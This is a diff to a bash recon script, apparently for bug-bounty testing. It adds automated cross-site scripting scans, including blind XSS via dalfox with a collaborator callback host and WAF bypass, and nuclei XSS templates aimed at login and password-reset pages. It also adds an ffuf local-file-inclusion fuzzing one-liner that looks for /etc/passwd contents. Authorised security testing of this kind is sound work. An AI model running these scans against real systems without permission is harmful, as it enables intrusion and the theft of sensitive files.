@@ -3,7 +3,7 @@
 PYTHON_VENV=$HOME/Python-Environments
 TOOL_DIR=$HOME/tools
 WORDLIST_DIR="$TOOLS_DIR/wordlists"
-
+COLLABORATOR_LINK= #PLEASE ADD IT LATER...
 OUTPUT=$HOME/recon
 mkdir -p "$OUTPUT"
 
@@ -40,6 +40,9 @@ katana -u "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" -d 5 -kf -jc -fx -ef wof
 
 echo "[+] Combining spidered URLS..."
 cat "$DOMAIN_DIR/gausubs_$TIMESTAMP.txt" "$DOMAIN_DIR/waybacksubs_$TIMESTAMP.txt" "$DOMAIN_DIR/katana_subs_$TIMESTAMP.txt" | sort -u | tee "$DOMAIN_DIR/allurls_$TIMESTAMP.txt"
+
+echo "[+] Collecting Cross Site scripting Parameters..."
+cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | gf xss | tee "$DOMAIN_DIR/xss_params_$TIMESTAMP.txt"
 
 echo "[+] Extracting js files..."
 cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | grep -E "\.js$" >> "$DOMAIN_DIR/js_$TIMESTAMP.txt"
@@ -107,6 +110,19 @@ cat "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" | dnsx -cname -ns -o "$DOMAIN_
 echo "[+] Scanning for subdomain takeover 3/3..."
 nuclei -l "$DOMAIN_DIR/filtered_domains_$TIMESTAMP.txt" -t takeover-detection -o "$DOMAIN_DIR/nuclei_takeover_$TIMESTAMP.txt"
 
+echo "[+] Scanning for Cross Site Scripting 1/4..."
+cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | Gxss | kxss | tee "$DOMAIN_DIR/xss_output.txt"
+
+echo "[+] Scanning for Cross Site Scripting 2/4..."
+cat "$DOMAIN_DIR/xss_params_$TIMESTAMP.txt" | dalfox pipe --blind $COLLABORATOR_LINK --waf-bypass --silence
+
+echo "[+] Scanning for Cross Site Scripting 3/4..."
+cat "$DOMAIN_DIR/allurls_$TIMESTAMP.txt" | grep -E "(login|signup|register|forgot|password|reset)" | httpx -silent | nuclei -t nuclei-templates/vulnerabilities/xss/ -severity critical,high
+
+echo "[+] Scanning for Cross Site Scripting 4/4..."
+cat "$DOMAIN_DIR/js_alive_$TIMESTAMP.txt" | Gxss -c 100 | sort -u | dalfox pipe -o "$DOMAIN_DIR/dom_xss_results.txt"
+
+echo $DOMAIN | gau | gf lfi | uro | sed 's/=.*/=/' | qsreplace "FUZZ" | sort -u | xargs -I{} ffuf -u {} -w payloads/lfi.txt -c -mr "root:(x|\*|\$[^\:]*):0:0:" -v
 
 ALIVE_COUNT=$(wc -l < "$DOMAIN_DIR/alive_$TIMESTAMP.txt")
 echo "[+] Found $ALIVE_COUNT alive hosts"
